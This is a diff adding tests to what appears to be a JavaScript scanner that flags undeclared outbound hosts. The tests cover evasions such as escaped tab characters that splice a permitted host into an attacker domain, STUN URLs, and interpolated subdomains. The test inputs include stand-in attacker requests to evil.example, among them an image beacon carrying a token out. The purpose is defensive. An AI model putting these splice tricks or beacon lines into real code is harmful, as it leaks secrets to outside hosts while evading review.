@@ -353,3 +353,67 @@ test("a trailing dot does not hide a host", () => {
   // invisible rather than reported.
   assert.ok(attack('const x = <img src="https://other.example./p.png" />;').some((f) => f.includes("other.example")));
 });
+
+// --- Parser-level borrows -----------------------------------------------------
+// The scanner reads SOURCE TEXT; the runtime reads the DECODED string, and WHATWG
+// URL parsing then removes tab/LF/CR. Every hole this control has had shares that
+// root cause, so each shape gets a test rather than a note.
+
+test("an escaped control character cannot splice a permitted host", () => {
+  // `fetch("https://api.github.com\\t.evil.example/x")` is
+  // api.github.com.evil.example at runtime — verify with
+  //   node -e 'console.log(new URL("https://a.example\\t.evil.example/").host)'
+  // Reading the source text and splitting on the backslash gave `api.github.com`:
+  // declared AND permitted, so the check read green while the request left for
+  // the attacker. Worse than a miss.
+  for (const escape of ["\\t", "\\u0009", "\\x09"]) {
+    const findings = attack(`fetch("https://shared.example${escape}.evil.example/x");`, [
+      shared({ request_from: ["dashboard/src/A.jsx"] }),
+    ]);
+    assert.ok(
+      findings.some((f) => f.includes("shared.example.evil.example")),
+      `${escape} spliced host not resolved: ${JSON.stringify(findings)}`,
+    );
+  }
+});
+
+test("a scheme with no slashes is still a request", () => {
+  // The IP-check page sends WebRTC STUN binding requests to Google and
+  // Cloudflare, disclosing the user's IP. `stun:` carries no `//` and appears in
+  // no https literal, so a scheme-anchored http(s) pattern could not see it —
+  // while the README certified "these hosts and no others".
+  assert.ok(
+    attack('const ice = [{ urls: "stun:stun.evil.example:19302" }];').some((f) =>
+      f.includes("stun.evil.example"),
+    ),
+  );
+});
+
+test("the scheme match is case-insensitive but does not fire inside another token", () => {
+  assert.ok(attack('const x = <img src="HTTPS://evil.example/p.png" />;').some((f) => f.includes("evil.example")));
+  // `arn:aws:bedrock:...` contains `ws:` and was reported as a host called
+  // `bedrock` — the noise that gets a check switched off.
+  assert.deepEqual(attack('const arn = "arn:aws:bedrock:us-east-1:1:foundation-model/x";'), []);
+});
+
+test("an interpolated suffix pins only a real zone, never a bare TLD", () => {
+  // `${sub}github.com` can resolve to the registrable `evilgithub.com`, so no pin.
+  // `${src}.ai` pins nothing either — `ai` is the TLD itself, and a comment
+  // illustrating a bad URL should not be reported as a destination.
+  assert.deepEqual(attack('const u = `https://${sub}shared.example/x`;'), []);
+  assert.deepEqual(attack("// fabricating `https://${src}.ai` resolves to unrelated domains"), []);
+  // A boundary that IS a zone still pins.
+  assert.ok(
+    attack("img.src = `http://${token}-${i}.probe.evil.example/p.gif`;").some((f) =>
+      f.includes("probe.evil.example"),
+    ),
+  );
+});
+
+test("data_from covers a host stored as a value and never fetched", () => {
+  // A mock fixture's `project_ref` is neither a link nor a request. Without its
+  // own category it lands on `link_from`, which is an UNCONDITIONAL waiver: once
+  // a file is there, any future request to that host from it passes forever.
+  const asData = shared({ data_from: ["dashboard/src/A.jsx"] });
+  assert.deepEqual(attack('const row = { project_ref: `https://shared.example/${repo}` };', [asData]), []);
+});
